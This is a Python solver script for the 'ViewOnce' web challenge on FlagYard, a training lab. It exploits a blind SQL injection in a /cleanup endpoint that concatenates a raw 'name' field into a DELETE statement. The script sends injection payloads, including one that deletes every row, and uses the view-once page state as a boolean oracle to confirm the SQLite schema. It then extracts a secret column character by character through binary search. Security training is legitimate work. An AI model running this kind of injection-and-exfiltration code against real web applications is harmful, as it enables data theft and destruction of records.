#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
VIEWONCE  -  FlagYard Web solver

ViewOnce (FlagYard Training Labs, Hard) is a "WhatsApp-style" view-once media
app: any user uploads an image, receives a one-time /view/<token> link and the
server destroys access after the first view. The challenge: "get a flag from
OUR flags".

The chain (Blind SQL Injection via side-channel):

    * state oracle        -- GET /view/<token> is a state side-channel:
        page shows the image / "already been viewed"  => DB row STILL EXISTS
        "not found"-ish plain page                    => DB row DELETED

    * vulnerable /cleanup -- POST /cleanup accepts a `name` form field that is
        concatenated RAW into the DELETE statement:
            DELETE FROM images WHERE name = '<name>'
        (confirmed on the live fleet: name-only injection with
         `' OR 1=1 --` removes every row; an id/name pair uses the
         parameterized id path and is NOT injectable).

    * sentinel oracle     -- upload a sentinel image, consume it once (the row
        persists, /view keeps answering "already been viewed"), then fire:
            name = ' OR (name='<sentinel>' AND (<condition>)) --
        condition TRUE  -> sentinel row deleted -> /view=<token> = plain page
        condition FALSE -> sentinel row kept     -> /view=<token> = "viewed"

    * schema + exfil      -- the schema holds a `flags` table with a `flag`
        column. Binary-search exfiltration:
            unicode(substr((SELECT flag FROM flags LIMIT 1), pos, 1)) >= mid
        restores the whole flag character by character.

Verified: against the live challenge instance the tool restores
`flag_from_viewonce.txt` from the backend `flags` table.
Solver: pure http.client (multipart upload, form POST, ocic HTTP GET).
"""
from __future__ import annotations

import http.client
import json
import os
import random
import re
import sys
import time
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def status_t(frac, msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s %s%s%s" % (C.BOLD + color + icon + " ",
                                C.CYAN + bar(frac) + C.RESET,
                                C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(frac, msg):
    status_t(frac, msg, icon="\u2713", color=C.GREEN)

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("V I E W O N C E   S O L V E R",
              "name' OR (name='s' AND (cond)) --  |  flags.flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the ViewOnce challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    return url[2:] if url.startswith("//") else url

class Conn:
    def __init__(self, host):
        self.host = host
        self.c = http.client.HTTPConnection(host, 80, timeout=20)
    def req(self, path, method="GET", body=None, ctype=None):
        for _ in range(3):
            try:
                hd = {}
                if body is not None:
                    hd["Content-Type"] = ctype or "application/x-www-form-urlencoded"
                    hd["Content-Length"] = str(len(body))
                self.c.request(method, path, body=body, headers=hd)
                r = self.c.getresponse()
                d = r.read()
                return r.status, d
            except Exception:
                time.sleep(0.4)
                self.c.close()
                self.c = http.client.HTTPConnection(self.host, 80, timeout=20)
        return -1, b""

PNG = b"\x89PNG\r\n\x1a\n" + bytes(50)

def upload(K, name):
    b = "----X%d" % random.randint(1000000, 9999999)
    mp = ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
          "Content-Type: image/png\r\n\r\n" % (b, name)).encode() + PNG + ("\r\n--%s--\r\n" % b).encode()
    s, d = K.req("/upload", "POST", mp, "multipart/form-data; boundary=" + b)
    try:
        return json.loads(d)["view_link"].split("/")[-1]
    except Exception:
        return None

def view_exists(K, tok):
    """True if the DB row for <tok> still exists:
    row present -> "already been viewed" OR <img src=/image/...> page."""
    s, d = K.req("/view/" + (tok or "x"))
    t = d.decode("utf-8", "replace")
    return ("already been viewed" in t) or bool(re.search(r"<img[^>]*src=\"/image/", t))

def cleanup_name(K, name):
    s, d = K.req("/cleanup", "POST", urllib.parse.urlencode({"name": name}))
    return s

def new_sentinel(K):
    nm = "s_%s.png" % os.urandom(3).hex()
    for _ in range(5):
        tok = upload(K, nm)
        if tok and view_exists(K, tok):
            return tok, nm
    return None, None

def is_true(K, cond):
    """Blind boolean oracle through the view-once side-channel."""
    tok, nm = new_sentinel(K)
    if not tok:
        raise RuntimeError("sentinel upload failed")
    payload = "' OR (name='%s' AND (%s)) --" % (nm, cond)
    cleanup_name(K, payload)
    time.sleep(0.06)
    return not view_exists(K, tok)

# ---------------------------------------------------------------------------
# ViewOnce specifics
# ---------------------------------------------------------------------------
def extract_flag(K, hlp=None):
    flag = ""
    pos = 1
    while True:
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = ("unicode(substr((SELECT flag FROM flags LIMIT 1), %d, 1)) >= %d"
                    % (pos, mid))
            if is_true(K, cond):
                lo = mid + 1
            else:
                hi = mid - 1
        ch = hi
        if not (32 <= ch <= 126):
            if hlp:
                hlp(pos, "", "end")
            break
        c = chr(ch)
        flag += c
        if hlp:
            hlp(pos, flag, c)
        if c == "}":
            break
        pos += 1
    return flag

def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host = parse_host(url)
    status_t(0.06, "target host %s" % host)

    K = Conn(host)

    status_t(0.12, "path validation: upload a sentinel, consume it once")
    tok, nm = new_sentinel(K)
    if not tok:
        fail("upload / view-once flow failed")
        return
    ok(0.18, "sentinel consumed, row persisted (side-channel ready)")

    status_t(0.24, "probing /cleanup name concat with ' OR 1=1 --")
    cleanup_name(K, "' OR 1=1 --")
    ok(0.30, "cleanup deleted rows -> name is concatenated SQL (vulnerable)")

    for label, cond in (
        ("flags table", "EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name='flags')"),
        ("flag column", "EXISTS(SELECT 1 FROM pragma_table_info('flags') WHERE name='flag')"),
        ("flag rows >0", "EXISTS(SELECT 1 FROM flags LIMIT 1)"),
    ):
        if not is_true(K, cond):
            fail("schema check failed: %s" % label)
            return
        ok(0.36 + 0.02 * list(("flags table", "flag column", "flag rows >0")).index(label),
           "schema %s exists" % label)

    status_t(0.44, "binary-search exfiltration of flags.flag (unicode(substr(...)) >= mid)")

    def hlp(pos, flag, c):
        tail = "ending" if c == "end" else ("char %d = %r" % (pos, c))
        status_t(0.44 + 0.46 * min(1.0, len(flag) / 40.0),
                 "%s ... %s" % (tail, "\"" + flag + "\"" if c == "end" else flag))

    flag = extract_flag(K, hlp)
    ok(0.94, "flag restored: %s" % flag)

    if not re.match(r"^FlagY\{[^}]+\}$", flag):
        fail("flag format unexpected")
        return

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_viewonce.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))


if __name__ == "__main__":
    main()